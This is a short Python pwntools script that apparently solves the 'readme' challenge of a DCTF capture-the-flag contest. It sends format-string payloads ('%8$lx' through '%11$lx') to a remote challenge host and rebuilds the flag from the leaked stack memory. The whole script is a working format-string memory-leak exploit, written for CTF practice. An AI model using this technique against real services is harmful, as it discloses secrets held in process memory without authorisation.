from pwn import *

flag = ''
for i in range(8, 11):
#    s = process('./readme')
    s = remote('dctf-chall-readme.westeurope.azurecontainer.io', 7481)
    s.recvline()
    s.sendline('%{}$lx'.format(i))
    s.recv(6)
    data = s.recvall()
    s = p64(int('0x' + (data.decode()[:-1]), 16)).decode()
    print(s)
    flag += s
print(flag)
s = remote('dctf-chall-readme.westeurope.azurecontainer.io', 7481)
s.recvline()
s.sendline('%{}$lx'.format(11))
print(s.recvall())

flag += chr(0x30)
flag += chr(0x6b)
flag += chr(0x35)
flag += '}'
print(flag)
